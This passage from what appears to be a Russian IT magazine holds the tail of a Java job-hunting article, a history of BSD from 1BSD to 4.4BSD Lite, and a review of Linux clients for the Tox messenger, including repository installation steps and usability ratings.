    Они могут много рассказать о тех компаниях, где работали или ра-
    ботают, и свести тебя с отделом кадров. Частенько они это делают
    с удовольствием в погоне за бонусами за привлеченных сотрудников.
       Если ты все же решил выбирать работодателя по сайтам с вакан-
    сиями, советую тебе внимательно изучить его страницу в интерне-
     те, поискать отзывы работников. Новые вакансии не всегда связаны
    с расширением компании, иногда они обусловлены текучкой кадров.
   Большие компании, которые работают с заказчиками из разных
     стран, менее подвержены влиянию кризиса, но и работа там чаще
    всего менее творческая. Маленькие компании — это, наоборот,
    больший риск, обычно они работают только над одним-двумя про-
    ектами, но из-за небольшой численности сотрудников там (еще) не
    развита бюрократия и тотальный контроль за разработчиком, и есть
    неплохой шанс поучиться на новых задачах и неизвестных технологи-
     ях, которые в большой компании, скорее всего, доверили бы выде-
    ленному специалисту.



РАБОТА НА ЧУЖБИНЕ
Программисты востребованы по всему миру, так что устроиться работать в ино-
странную компанию — не такая уж сложная задача. Возможно, некоторые ком-
пании потребуют подтверждения диплома или сертификата на знание англий-
ского, но большинство принимает и без этого.
   Собеседование в иностранную компанию обычно проходит в несколько
этапов. Какой-то структурностью они особо не отличаются, иногда вопросы
перескакивают с одной темы на другую. Главное — не волноваться, как гово-
рили небезызвестные пингвины, «улыбаемся и машем». Не нужно смотреть на
собеседника мрачнее тучи и хмуриться при виде неизвестного вопроса. Если
что-то не понял в вопросе, обязательно переспроси, но максимально вежливо
и дружелюбно. Старайся рассуждать вслух над каждым вопросом, привыкай,
что, пока ты будешь писать код, кто-то будет пялиться в монитор. Обязательно
расспроси про компанию, про проект, про команду, приготовь список вопросов
заранее. Иностранные компании могут позволить себе выбирать сотрудника,
поэтому на качественную самопрезентацию надо обратить самое пристальное
внимание. Если ты разослал резюме в кучу компаний, а ни одна так и не позва-
ла на собеседование, не отчаивайся. Устроиться на работу за границу можно
и через местные аутсорсинговые компании, у них всегда имеется парочка ва-
кансий с переездом ближе к офису заказчика.

НЕ РАССЛАБЛЯЙСЯ
Ну и напоследок, устроившись на работу, не забывай, что удел программиста —
учиться всю жизнь. Старайся посвящать немного времени каждый день озна-
комлению с новыми фреймворками и технологиями, обсуждай их с коллегами,
посещай время от времени конференции, посвященные Java или техноло-
гиям, с которыми приходится работать. Неплохие конференции, посвящен-
ные Java-технологиям, — Joker и JPoint. Создатели фреймворков, например
Spring, часто проводят бесплатные вебинары по нововведениям, на них легко
подписаться на сайте компании. Столкнувшись с «магией» в проекте, старайся
разобраться, почему заработало / не заработало, это поможет углубить знания
фреймворков и их взаимодействия без отрыва от работы. Есть идеи собствен-
ных проектов? Реализуй! Периодически просматривай вакансии, чтобы быть
в курсе технологий, пользующихся спросом.
UNIXOID
ТУР ПО BSD

         ЧАСТЬ 1. РОЖДЕНИЕ BERKELEY
                SOFTWARE DISTRIBUTION





                                                                                    Евгений Зобнин
                                                                                                   zobnin@gmail.com
В «Юниксоиде» мы постоянно пишем про Linux
и FreeBSD, но совсем забываем о других BSD-
системах. Может показаться, будто дело в том,
что эти системы морально умерли и не годятся для
реального использования. Это не так, настоящая
причина — низкий интерес к BSD. Мы хотим это
исправить и этим циклом статей покажем, что BSD
не только живы и активно развиваются, но и невероятно
красивы с точки зрения архитектуры и более чем
пригодны для применения.


ВМЕСТО ВВЕДЕНИЯ
Всего у нас будет четыре статьи с общим названием «Тур по BSD». Эта ста-
тья посвящена истории возникновения BSD и ее пути от простого набора про-
грамм до полноценной операционной системы, впоследствии разделившейся
на множество вариантов. Во второй части мы поговорим о NetBSD — первой
из всего семейства BSD, дожившего до наших дней, и самой портируемой ОС
в мире (не надо про Linux, потом все объясню). Третья часть будет посвящена
OpenBSD, проекту защищенной со всех сторон операционки, который держит-
ся на плечах грубого, заносчивого, упертого, но очень талантливого програм-
миста и руководителя. А закончим рассказом о самой молодой и неоднознач-
ной, но очень интересной в архитектурном плане DragonFly и ее гибридном
ядре и ломающей все стереотипы ФС HAMMER.
  Ты можешь подумать, что посвящать отдельную статью истории BSD — это
излишество и о ней можно было бы сказать кратко, но не торопись делать вы-
воды. История BSD — не просто история студентов-ботанов из университета
Беркли, которые, вместо того чтобы пить пиво и устраивать тусовки, писали код.
Это история возникновения движения первых тру-хакеров, история появления
идеи открытого исходного кода, история Билла Джоя, основателя легендарной
компании Sun, и Эрика Шмидта, председателя совета директоров компании
Alphabet Inc. (Google), история возникновения культового редактора vi, API со-
кетов и эталонной реализации TCP/IP-стека, история судебных тяжб и пере-
писывания большей части кода системы просто потому, что толстосумы хоте-
ли заработать побольше денег. В конце концов, это просто теплая ламповая
история, частью которой хотелось бы быть любому из нас.
МЛАДЕНЧЕСТВО: 1BSD, 2BSD
Давным-давно, в далекой-далекой лаборатории Bell Labs
выпускник Беркли Кен Томпсон и его коллега Деннис Ритчи
решили создать игру Space Travel. Они получили добро от
руководства, выбили на реализацию идеи старый компью-
тер PDP-7 и, чтобы как-то писать и запускать игру на нем,
вынуждены были написать операционную систему. Впо-     FUN FACT
следствии она стала известна как UNICS (только позднее
                                                                         Первая коммерче-CS сменилось на X) и в том или ином варианте продолжает                                                                                ская версия UNIX
жить до сих пор. Произошло это в 1969 году, и уже в 1971-                                                                       была написана на
м Bell Labs начала продавать операционку университетам       языке B, а всем
и исследовательским лабораториям.                               известный сегодня
                                                                          си появился только
   Однако вовсе не принадлежность Томпсона к Беркли                                                                                 спустя год. Много
определила имя возникшей впоследствии BSD, а тот факт,      позже Страуструп
что в 1973 году копию UNIX вместе со всеми исходными тек-    сломал алфавит и на-
                                                                              звал свой язык C++стами (это стандартный комплект поставки) приобрел Боб                                                                              вместо D.
Фабри для запуска на компах в кампусах того самого Берк-
ли. Как и ожидалось, необычная и архитектурно красивая
UNIX жутко понравилась студентам (среди которых был Билл Джой), и они начали
ее всячески хакать и видоизменять. Шло время, модификации копились, слухи
о наработках студентов из Беркли ползли, и, наконец, в 1977 году Билл Джой
принимает решение выпустить первый релиз BSD.
  Дальше мне следовало бы начать рассказ о том, насколько крута была 1BSD
для тех времен, но я просто перечислю содержимое бобины с магнитной лентой
Berkeley UNIX Software Tape: компилятор и профайлер Pascal (написанный Ке-
ном Томпсоном во время визита в Беркли в 1975-м), редактор ex, улучшенный
UNIX-шелл ashell, игра Star Trek и еще несколько инструментов. Все с исходни-
ками, man-страницами и прекомпилированными бинарниками.
   Это все, что было на ленте, и ты легко можешь в этом убедиться, так как ее
содержимое до сих пор гуляет по Сети. Очевидно, что при доступности исход-
ников UNIX изменения вносились и в нее, но то ли по причине лицензионного
соглашения, то ли по какой-то другой эти изменения не вошли в «релиз».
   Как бы там ни было, 30 магнитных лент 1BSD были разосланы в разные уни-
верситеты, а 35 — проданы по 50 долларов за штуку (что, кстати, очень де-
мократичная по тем временам цена). При этом Билл Джой никак не запрещал
модифицировать исходные тексты включенных в 1BSD приложений и исполь-
зовать их для создания собственных программных продуктов. Более того, он
отслеживал изменения других людей и аккумулировал их для включения в сле-
дующие релизы BSD. Эта абсолютно новая для того времени модель разра-
ботки и распространения позднее стала известна как Open Source.
   Результатом дальнейшего хакинга и разработок стала 2BSD, выпущенная
в 1979-м. Как и прошлый выпуск, 2BSD не содержала самой ОС, но на этот
раз включала в себя ставшие впоследствии визитной карточкой BSD-систем
редактор vi с его любимой олдфагами и ненавистной новичкам двухрежимно-
стью и шелл csh с си-подобным синтаксисом (оба — детище Билла Джоя). Так-
же на ленту попал сетевой пакет Berknet, позволяющий обмениваться письма-
ми, отправлять задания на печать, выполнять удаленные команды внутри сети
Беркли, а также выходить в ARPANET. Его создал Эрик Шмидт, в рамках обыч-
ной дипломной работы.





                                                FUN FACT

                                                                           Знаменитое клави-
                                                                                атурное сочетание
                                                                                                            hjkl для навигации по
                                                                                      тексту в vi выбрано не
                                                                                 только по причине бы-
                                                                                  строго доступа паль-
                                                                       цами правой руки,
                                                                            но и просто потому,
                                                                                     что на клавиатурах
                                                                                       тех времен не было
                                                                          клавиш навигации.





Терминал DEC VT100 — именно его программная реализация
сегодня носит имя «Эмулятор терминала»

ПОДРОБНОСТИ О 1BSD
Весь софт на бобине занимал 1,2 Мбайт и распаковывался в 3,4 Мбайт. Каж-
дый инструмент располагался в своем обособленном каталоге в архиве типа
ar (сегодня используется для запаковки объектных файлов в статическую би-
блиотеку, расширение .a) и снабжен описанием и инструкциями по установ-
ке, располагающимися в файле READ_ME (да, с подчеркиванием!). Главный
файл READ_ME в формате troff (man-страница) пояснял, что вообще такое BSD
и как это все установить. В описании есть забавные строки типа «This will require
about 10 000 blocks of storage...» и «_.P_.a_.s_.c_.a_.l» (это заголовок из файла
с названием wow).
   Этикетка на ленте гласила:


                     Berkeley UNIX Software Tape
                        Jan 16, 1978 TP 800BPI
                       To extract contents do:
                    tp xm ./setup; sh setup; tp xm

Вторая этикетка предупреждала, что софт распространяется только для тех,
кто приобрел лицензию UNIX:

                    The contents of this tape are
                    distributed to UNIX licensees
                    only, subject to the software
                   agreement you have with Western
                    Electric and an agreement with
                    the University of California.



ЮНОСТЬ: 3BSD — 4.1BSD
В 1978 году Беркли купила компьютер VAX-11, и этот момент стал одним из важ-
нейших событий в истории BSD и привел к ее превращению из просто Software
Distribution в полноценную операционную систему. Свою роль здесь сыграли два
фактора: нежелание слазить с иглы UNIX и переходить на VMS и отсутствие пол-
ноценного порта UNIX на VAX. Последний хоть и существовал, но не использовал
важнейшую особенность компьютера — систему виртуальной памяти.
   Исправлением этой проблемы занялись, разумеется, студенты. Результа-
том стала 3BSD, включающая в себя сильно модифицированное ядро UNIX, на-
бор стандартных UNIX-утилит и, конечно же, доработанный набор утилит 2BSD.
Система была выпущена в конце 1979 года, и вскоре после этого на нее обра-
тила внимание DARPA. Да-да, военные решили профинансировать группу ис-
следования компьютерных систем (Computer Systems Research Group — CSRG)
Беркли с целью использовать ее наработки в своих проектах.
   Финансирование DARPA дало свои плоды, и менее чем через полгода на свет
появилась 4BSD (ноябрь 1980-го), а еще через полгода (июнь 1981-го) — 4.1BSD.
Последняя вообще-то должна была стать 5BSD, но была переименована по
просьбе AT&T (бывшая Bell Labs), так как покупатели могли спутать ее с UNIX
System V (к тому времени UNIX и BSD уже стали синонимами, и многие органи-
зации покупали UNIX только для того, чтобы иметь право использовать BSD как
систему, основанную на ее коде).
   Главными новшествами 4BSD стали: предшественник sendmail под назва-
нием delivermail (забавно, что он доставлял почту путем заливки на FTP-сер-
вер), система управления задачами в csh (те самые комбинации <Ctrl + Z> и ко-
манды fg и jobs) и библиотека curses для построения псевдографического
интерфейса. Последняя, в ее более свежей реинкарнации ncurses (new curses),
используется до сих пор такими приложениями, как top, mc, mutt, и большей
частью полноэкранного интерактивного консольного софта.

                                                         Мини-компьютер
                                                                  VAX-11 был не таким
                                                      уж мини





                                                FUN FACT

                                                                          Ядро BSD для
                                                                            компьютера VAX
                                                                                в файловой системе
                                                                             находилось по адресу
                                                                                          /vmunix, что было
                                                                          сокращением от
                                                                                                       Virtual Memory Unix.
                                                                             Если ты взглянешь
                                                                              на содержимое ка-
                                                                                    талога /boot в любом
                                                                               дистрибутиве Linux,
                                                                                      то заметишь, что
                                                                            традиция жива до сих
                                                                                   пор. Правда, вместо
                                                                                       vmlinux используется
                                                                                           vmlinuz, где z означает
                                                                                                   zip (а точнее, gzip), то
                                                                                    есть компрессию.
  К тому времени BSD уже была очень популярна среди пользователей VAX-
11, и большинство организаций предпочитали ее стандартной VMS. Пробле-
ма заключалась только в чрезмерной медлительности системы, из-за чего она
сильно проигрывала VMS. Билл Джой сумел за полгода оптимизировать систе-
му так, чтобы она шла вровень с VMS. Эти наработки вошли в 4.1BSD.
   Как ни странно, в то же время продолжала свое развитие 2BSD, и к релизу
2.9 она также превратилась в полноценную ОС, основанную на коде UNIX V7.
Практически все изменения в ней были бэкпортами из более поздних версий
BSD, а последний патч датируется аж 17 июня 2012 года (остается только по-
дивиться, где в 2012 году его автор нашел музейный PDP-11).

ЗРЕЛОСТЬ: 4.2BSD — 4.3BSD
К версии 4.2 (август 1983-го) BSD уже начала обретать черты той самой си-
стемы, какой мы ее знаем сейчас. Именно в этой версии впервые появился
стек TCP/IP и API сокетов, используемый в любой современной операцион-
ной системе. Более того, написанная Биллом Джоем реализация стека TCP/
IP оказалась настолько хороша, что она не только заменила собой считавший-
ся до этого эталонным стек от компании BBN (он развивался с середины се-
мидесятых и появился в промежуточном релизе 4.1a), но и была практически
без изменений позаимствована для других операционных систем, в том числе
Windows 95. Сегодняшняя реализация TCP/IP-стека в BSD-системах (а значит,
во множестве основанных на них устройств) до сих пор базируется на коде
Билла Джоя.
  Вторым важным новшеством 4.2BSD стала файловая система FFS (Fast File
System), дожившая до наших дней под именами FFS, UFS1 и UFS2 в разных
BSD-системах. В мире UNIX FFS быстро стала стандартом и была интегрирова-
на в оригинальную версию системы от Bell Labs, откуда перекочевала в Solaris.
Файловая система ext2, которая долгое время была включена как стандартная
в Linux-системы и до сих пор используется как часть ext3/4, по сути, базируется
на идеях UFS1. Со времен 4.4BSD файловая система практически не измени-
лась, но обросла некоторой дополнительной функциональностью (soft updates,
например) и оптимизациями, а ее автор, Маршалл Кирк Мак-Кузик, до сих пор
состоит в команде разработчиков FreeBSD.
   4.2 стала первой версией BSD, выпущенной без уча-
стия Билла Джоя, к тому времени уже основавшего Sun
Microsystems. Его роль взяли на себя Мак-Кузик и Майк
Карелс. Тогда же появился и знаменитый маскот: улыбаю-
щийся демон в кедах с трезубцем в руках. Его нарисовал
Джон Лассетер, впоследствии ставший режиссером ани-
мационных фильмов «История игрушек», «Жизнь жуков»,                                                           Знаменитый добрый
«Тачки» и других фильмов студии Pixar.                      демон BSD
   Спустя чуть менее чем три года состоялся релиз 4.3BSD, который, как ни
странно, большей частью был работой над ошибками и оптимизацией кода,
однако уже после его выпуска произошло важное событие — порт на платфор-
му Power 6/32. Сам он оказался бессмысленным, так как платформа вскоре
перестала существовать, но позволил значительно переработать кодовую базу
BSD путем разделения на платформенно зависимую и независимую части.
Благодаря такому разделению портировать BSD на новые архитектуры стало
значительно проще.
  BSD до сих пор была основана на коде UNIX, а потому использующие ее
компании продолжали «платить дань» AT&T, покупая лицензию на оригиналь-
ную версию системы, даже если они вообще не распаковывали бобины с си-
стемой. Поэтому разработчики решили выпустить BSD Net/1. По сути, это были
просто исходники кода сетевого стека, но зато за их использование не прихо-
дилось платить ничего и никому. Чуть позже разработчики использовали тот же
подход для выпуска Net/2 — практически полноценной ОС, с переписанными
с нуля участками кода AT&T. И здесь начались проблемы.

СУДЕБНЫЕ РАЗБИРАТЕЛЬСТВА, 4.4BSD И LINUX
Переписывание исходников заняло всего восемнадцать месяцев, и релиз Net/2
увидел свет в июне 1991 года. Это уже был чистейший Open Source: никаких вы-
плат никому и ни за что, свобода модификации исходников и распространения
основанных на них продуктов и так далее (фактически лицензия BSD гласила:
«Делайте с нашим кодом все, что хотите, только оставьте в исходниках упоми-
нание его авторов»). Чуть позже на базе Net/2 Уильям Джолиц создал систему
386BSD, которая, как нетрудно догадаться, была портом на x86.
   Возможно, в таком виде BSD и продолжила бы благополучно развиваться,
не реши ее авторы чуть заработать и профинансировать дальнейшее развитие
ОС (CSRG, поддерживаемая DARPA, закрывалась). Они основали компанию
BSDi (Berkeley Software Design, Inc.) и начали продавать проприетарную вер-
сию BSD для x86 (BSD/386, в отличие от появившейся позднее 386BSD, была
закрыта). Причем не просто продавать, а значительно дешевле оригинального
UNIX: 995 долларов против 20 000.
  И тут возникла интересная ситуация. AT&T, получавшая львиную долю при-
были «за воздух» (все, кто использовал BSD, платили AT&T), да еще и перета-
скивающая ключевые технологии BSD в UNIX, возмутилась и решила задавить
конкурента судебными исками. Основных претензий было две: 1) BSD продол-
жает базироваться на коде AT&T, 2) BSDi использует торговый знак UNIX без
разрешения (а все из-за номера 1-800-ITS-UNIX, позвонив по которому можно
было заказать BSD/386). В результате на несколько лет BSDi погрязла в бес-
смысленных судебных разбирательствах, и это не было бы столь важным, если
бы все пользователи BSD Net/2 не оказались на тот же период в подвешенном
состоянии: AT&T предъявляла претензии на весь код BSD, так что до вынесе-
ния судебного решения распространять его было запрещено.
  Много лет спустя Линус Торвальдс признался, что, если бы код BSD не стал
жертвой бюрократии, он вряд ли создал бы Linux — в нем просто не было бы
необходимости. Но, как мы знаем, история повернулась иначе: конфликт бо-
лее-менее разрешился только в 1993 году признанием кода BSD свободным
от кода AT&T после удаления трех файлов исходников и модификации семиде-
сяти. К тому времени кривой, сырой и не идущий ни в какое сравнение с BSD
Linux уже завоевал огромную популярность, и о BSD начали забывать.
  Тем не менее даже во времена судебных разборок код BSD продолжал раз-
виваться внутри Беркли. Появился порт BSD Net/2 на x86 (тот самый 386BSD),
который в 1993 году разделился на две независимые ветки: NetBSD и FreeBSD,
затем от NetBSD отпочковалась OpenBSD, а FreeBSD породила DragonFly.
А в 1994 году была выпущена 4.4BSD Lite, новшества которой позднее влились
в NetBSD и FreeBSD.

                                                           Оригинальная
                                                          обложка диска
                                                             4.4BSD Lite
ВЫВОДЫ
BSD дала миру целый ворох используемых и поныне технологий, воспитала
большое количество именитых людей и косвенно способствовала появлению
Linux. Но это далеко не все, в следующих статьях ты узнаешь, как BSD повлияла
на Android, почему Microsoft вкладывалась в развитие OpenBSD, почему NetBSD
более портабельна, чем Linux, и зачем все-таки нужна DragonFly BSD. Ну и ко-
нечно же, о том, зачем вообще все это нужно, когда есть Linux.





История UNIX и BSD
UNIXOID
САМЫЙ
БЕЗОПАСНЫЙ IM
РАССМАТРИВАЕМ КЛИЕНТЫ TOX ДЛЯ LINUX





   Артём Зорин,
 temazorin@hotmail.com
Tox — новый протокол (разработка активно ведется
с лета 2013 года) для обмена текстовыми сообщени-
ями, голосовой и видеосвязи, созданный как альтер-
натива Skype и другим VoIP-сервисам. К слову, Skype
с 2011 года находится под присмотром спецслужб
разных стран. Как и Skype, Tox предлагает полный
набор привычных функций: голосовую и видеосвязь,
конференции с несколькими участниками, сетевые
статусы, эмотиконы, обмен текстовыми сообщениями
и передачу файлов. И никакой рекламы.


НЕМНОГО ИСТОРИИ
В наше неспокойное время, когда информация порой решает слишком мно-
гое, по-настоящему безопасное общение в Сети имеет очень большое значе-
ние. Несмотря на сравнительную молодость проекта, он стремительно разви-
вается. К слову, пока писалась эта статья, ядро Tox успело обновиться четыре
раза за неделю. Связь между пользователями организована с помощью над-
стройки над протоколом UDP. Каждому пользователю присваивается специ-
альный публичный ключ, который также используется и для шифрования. Для
установления коммуникаций требуется соединение к пиру (каждый клиент сети
является пиром), который может быть определен вручную или найден автома-
тически. Доступна функция поиска пиров в локальной сети. Tox — это не просто
мессенджер, это целый протокол обмена информацией, суть которого в рабо-
те пиринговой сети, похожей на BitTorrent Sync.
   Главное его достоинство — полная децентрализация
и шифрование всего трафика. А это, в свою очередь, за-
лог полной анонимности, столь востребованной в наше
время. Нет единого центра идентификации пользователя.
ID юзера создается и хранится локально. В Linux это папка
~/.config/tox. Код Tox написан на языке си и распростра-                                                        INFO
няется под лицензией GPLv3. Большая часть создателей
ни разу не видели друг друга вживую и обитают на 4chan.     Основная проблема
                                                                   ВСЕХ IM —Самые важные преимущества Tox — это открытый исход-
                                                                                   это контроль
ный код, отсутствие выделенных серверов и, самое глав-                                                                               за ними со стороны
ное, никакого контроля со стороны какой-либо софтвер-        ИТ-компаний.
ной компании.
   Для каждой из операционных систем отдельно разрабатывается свое клиент-
ское приложение. При этом общая идея проекта остается неизменной. Разра-
ботчики пишут сразу несколько версий клиентов с разными наборами функций,
но в качестве официальных предлагаются самые стабильные и доведенные до
ума версии. Tox разрабатывается с помощью сервиса GitHub, откуда можно ска-
чать исходники самой свежей версии. Соединение защищено с использовани-
ем прокси-серверов SOCKS. А это, в свою очередь, позволяет перенаправлять
весь трафик через Tor. Функции шифрования реализуются с помощью библио-
теки NaCl (читается как salt, «соль»), разработанной под руководством Дэниела
Бернштайна (Daniel J. Bernstein) в университете штата Иллинойс в Чикаго.
   Tox — не единственный сервис защищенной связи. Альтернативы разраба-
тываются и другими адептами СПО. К примеру, Briar, созданный командой раз-
работчиков под руководством Майкла Роджерса (Michael Rogers) из Делфтско-
го университета, или проект Invisible.im, основанный аналитиком Патриком
Греем (Patrick Gray) и автором фреймворка Metasploit. Оба клиента являются
защищенными аналогами WhatsApp, Viber и прочих мессенджеров. Есть также
и коммерческие решения для шифрования обычных телефонных разговоров.
Наиболее востребованными стали приложения Signal для iPhone и Silent Circle
для Android. Но Tox может стать решением, которое полностью заменит при-
ватные мессенджеры и программные криптофоны. «Сейчас Tox — это просто
защищенный и безопасный туннель между узлами сети, — говорит один из
участников проекта Дэвид Лоул (David Lohle) изданию Wired. — Что именно вы
будете передавать по нему, ограничивается лишь вашим воображением».

                                                                    Tox был создан
                                                            после откровений
                                                           Эдварда Сноудена





                                   WWW

                                                                      Последние известия
                                                                         про Tox по-русски

                                                                     Информация
                                                                           о клиентах Tox
В обзоре будет рассмотрено несколько распространенных клиентов Tox для
Linux. Сразу оговорюсь — клиенты Tox для Linux пока сыроваты, и требователь-
ным пользователям понравится не все. Тестирование всех клиентов Tox прово-
дилось на Ubuntu 15.10 с рабочим столом Mate.

РАСКОЛ В СООБЩЕСТВЕ TOX
В начале июля 2015 года разработчики Tox заявили о разрыве отношений с Tox
Foundation, созданной в свое время в качестве компании — представителя про-
екта. Дело в том, что некто Шон Куреши (также известный под никами Stqism,
AlexStraunoff и NikolaiToryzin), бывший главой и единственным членом совета ди-
ректоров Tox Foundation, «занял» часть денег фонда на личные цели. Неизвест-
но, сколько именно взял Куреши. По словам разработчиков, сумма составила
несколько тысяч долларов. Большая часть денег были призовые, полученные
Tox после участия в Google Summer of Code 2014, также какая-то часть — по-
жертвования от частных лиц.
   После случившегося сайт проекта переехал на новый домен tox.chat. Дело
в том, что Куреши не только предоставлял хостинг, но и владел старыми до-
менами. Разработчики решили продолжить работу над проектом, несмотря на
случившееся. Код проекта не был скомпрометирован. Пользователей попро-
сили оперативно сменить репозитории.
   14 сентября 2015 года Куреши заявил, что не тратил деньги проекта на лич-
ные нужды, а пустил их на покрытие растущих издержек по обслуживанию ин-
фраструктуры проекта. Также Куреши обещал представить доказательство
своей невиновности в виде чеков и квитанций по оплате услуг хостинга, но до
сих пор этого не сделал.


UTOX
Первый в обзоре, но не первый в рейтинге — uTox, официальный клиент Tox,
рекомендованный разработчиками. На момент написания этой статьи поль-
зователям Linux доступна альфа-версия 0.5.0. К сожалению, в репозиториях
Ubuntu бинарного пакета uTox не нашлось: проект еще недостаточно стаби-
лен. Установка uTox несложна для опытного пользователя. Процесс установки
идентичен в Ubuntu и в Debian.
  Все сводится к добавлению в файл /etc/apt/sources.list репозитория
Tox, ключа к нему и установке uTox через менеджер пакетов APT. Единствен-
ное, что нужно сделать, — это заменить $CODENAME на release. Это справед-
ливо и для Ubuntu (начиная с 14.04), и для Debian:
$ echo “deb https://pkg.tox.chat/debian nightly $CODENAME” |
    sudo tee /etc/apt/sources.list.d/tox.list
$ wget -qO - https://pkg.tox.chat/debian/pkg.gpg.key |
    sudo apt-key add -
$ sudo apt-get install apt-transport-https
$ sudo apt-get update

В виде бинарного пакета uTox доступен пользователям Gentoo и Arch Linux. При
желании и умении можно собрать uTox из исходников. Вся инфа на английском
тут. После установки uTox нужно настроить. Самое главное здесь — задать
путь к своему профилю Tox, который хранится локально. Отдельного внима-
ния заслуживает TOX ID. Это 76-значное шестнадцатеричное число. Случайно
сгенерированный набор байтов, который уникален для каждого пользователя.
Выглядит TOX ID, прямо скажем, устрашающе. Вряд ли кто-то в здравом уме
сможет запомнить такое:

               42E9CA1A838AB6CA8E825A7C48B90BAFE1E22B
               9FA467A7AD4BA2821F1344803BD71BCB00A535

Однако есть способ создать более удобный ID. Получить его можно на сайте
uTox. Просто выбери себе подходящий ник и вставь из приложения свой TOX
ID, и ты получишь удобный и красивый идентификатор вида nickname@utox.org.
  При первом запуске uTox попросит тебя завести новую учетную запись или
же ввести данные существующей. Интерфейс uTox напоминает Skype, только
без рекламы. Пользоваться приложением просто и удобно. Настройки не изо-
билуют разнообразием, но логичны и понятны любому мало-мальски опытному
пользователю. Несмотря на статус альфа-версии, uTox работает стабильно. За
все время использования (больше недели) он падал лишь три раза. Обновле-
ния выходят чуть ли не каждый день.
   Качество звука на уровне SIP. Чем-то даже лучше, особенно на узком ин-
тернет-канале. Но до уровня Skype не дотягивает. Не стоит забывать, что в от-
личие от Skype у Tox нет инфраструктуры серверов. Видеосвязь тоже работает
стабильно, без разрывов и заиканий. Качество зависит от веб-камеры и ско-
рости соединения. Передача небольших файлов (3–50 Мбайт) проходит без
проблем. А вот попытка отправить видео размером 150 Мбайт закончилась
неудачей. При последующих попытках uTox просто рушился. Но это в первую
очередь мессенджер, а не средство пересылки больших файлов. Главное ощу-
щение, которое не покидало меня за все время тестирования uTox, — это чув-
ство недоделанности. Да, проект на стадии альфа. И это видно сразу. В целом,
uTox производит впечатление практически готового решения для анонимного
общения в Сети. И может практически полностью заменить Skype.
Главное окно uTox

Рейтинг
•  удобство: 7 баллов;
•  функциональность: 10 баллов;
•  простота настройки: 6 баллов;
•  стабильность: 5 баллов.

QTOX
Следующий «официальный» клиент Tox — это qTox. Приложение написано на С++
с использованием фреймворка Qt 5. Последняя на данный момент версия —
1.2. Установка проходит так же, как и установка uTox. То есть, единожды добавив
репозиторий uTox, ты сможешь установить из него и qTox. Размер сообщений
в qTox ограничен 1372 байтами. Есть аудио- и видеосвязь, фильтр шума и пода-
вление эха (полезно, если пользоваться встроенным микрофоном и колонками).
Поддерживаются эмотиконы и прокси. Все как в Skype. Главное достоинство
qTox — это высокая скорость работы. Пожалуй, это самый быстрый клиент Tox
для Linux. Интерфейс во многом повторяет uTox. Разве что выглядит приложение
более доработанным и удобным для пользователя. Вылетает программа гораздо
реже: за все время qTox рухнул всего раз. Обновления появляются каждый день,
даже в выходные. Звук и видео передаются, на мой взгляд, хуже, чем в uTox, но
стабильно. Хотелось бы, чтобы в новых версиях приложение научилось менять
шрифт в окне набора текста. Не помешает и возможность смены статуса через
контекстное меню значка программы в системном лотке.
  Важно! Все клиенты Tox используют общую папку профиля, где и хранят
свои настройки. Но, как ни странно, контакт, добавленный в список в uTox, ни-
как не отображается в qTox. И его приходится добавлять в список контактов за-
ново. Возможно, это связано с тем, что у приложений разные файлы настроек.
   qTox — готовое решение для протокола Tox. По всей видимости, его пред-
почтут пользователи KDE.

                                                            Видеосвязь
                                                                работает исправно





Рейтинг
•  удобство: 9 баллов;
•  функциональность: 10 баллов;
•  простота настройки: 7 баллов;
•  cтабильность: 9 баллов.

TOXIC
Этот клиент Tox создан для настоящих линуксоидов. Он — консольный. Toxic
написан на си с использованием псевдографической библиотеки ncurses и до-
ступен только для Linux и FreeBSD. Кстати, вышел он одним из первых, еще во
второй половине 2013 года, и является одним из самых старых клиентов Tox.
Устанавливается из репозитория Tox, так же как и в случае с qTox и uTox. Люби-
тели сложностей могут попробовать собрать Toxic из исходников. Для BSD-си-
стем имеются скомпилированные порты. Пользоваться Toxic довольно просто
(насколько это возможно при работе в терминале). Запуск — команда toxic,
получить помощь — команда toxic  –help. Дополнительные настройки про-
граммы хранятся в конфигурационном файле ./config/tox/toxic.conf. При-
мер файла можно найти на сайте Toxic.
   Приятно удивила функция голосовых и даже видеоуведомлений на рабочем
столе. Из стандартных возможностей можно отметить симуляцию статуса
«офлайн», поддержку SOCKS5 и HTTP-прокси, блокировку неугодных контак-
тов, защиту профиля паролем, шифрование профилей пользователей. И ко-
нечно, аудио- и видеосвязь. По удобству Toxic проигрывает uTox и qTox, но не
стоит забывать, что это консольный клиент.





Спартанский интерфейс Toxic

Рейтинг
•  удобство: 4 балла;
•  функциональность: 6 баллов;
•  простота настройки: 4 балла;
•  cтабильность: 9 баллов.

XWINTOX
XwinTox — это экспериментальный клиент Tox, разработанный не столько для
Linux, сколько для других BSD-систем, таких как Solaris или FreeBSD. Но при
желании его можно собрать и в Linux из исходников. Код написан на С и С++,
интерфейс реализован с помощью графического тулкита FLTK. Разработчики
утверждают, что благодаря модульной конструкции XwinTox является самым
быстрым и безопасным клиентом Tox. По их словам, из-за разделения на мо-
дули приложение использует меньше ресурсов компьютера и работает зна-
чительно быстрее остальных клиентов Tox. На деле в Linux XwinTox работает
примерно так же, как и uTox. Хотя памяти потребляет чуть меньше. Иногда
падает, особенно при попытке отправить файл от 150 Мбайт. Выглядит при-
ложение в Linux, прямо скажем, некрасиво. Видимо, это издержки использо-
вания FLTK.
  По сути, это тот же uTox, только написанный с использованием не GTK+
или Qt, а FLTK. Вообще, интерфейс практически всех десктопных клиентов
Tox (неважно, Linux это, OS X или Windows) повторяет интерфейс uTox. И это
хорошо. Поддерживаются обмен текстовыми сообщениями, аудио- и виде-
озвонки. Качество связи не вызывает претензий. Но это заслуга скорее ядра
Tox, а не XwinTox. XwinTox лучше подойдет тем, кто использует  Solaris
и BSD-системы.

                                                                  XwinTox все же
                                                            не для Linux





                                               WARNING

                                                                Ни в коем случае не уда-
                                                                         ляй папку с настройками
                                                                              Tox ~/.config/tox! Это
                                                                    может привести к потере
                                                                            приватного ключа Tox!

Рейтинг
•  удобство: 9 баллов;
•  функциональность: 8 баллов;
•  простота настройки: 7 баллов;
•  стабильность: 3 балла.
МОБИЛЬНЫЕ КЛИЕНТЫ
И КЛИЕНТ ДЛЯ WINDOWS
За рамками этого обзора остались мобильные клиенты Tox и приложения для
Windows. Приложения для двух основных мобильных платформ пока недоста-
точно стабильны и поддерживают не все функции Tox. Пользоваться ими мож-
но в основном для приема и отправки текстовых сообщений и файлов.
   Antox — клиент Tox для Android. Проект активно разрабатывается и нахо-
дится в стадии бета-тестирования. В данный момент пользователю доступен
только обмен текстовыми сообщениями и файлами, а также групповые чаты.
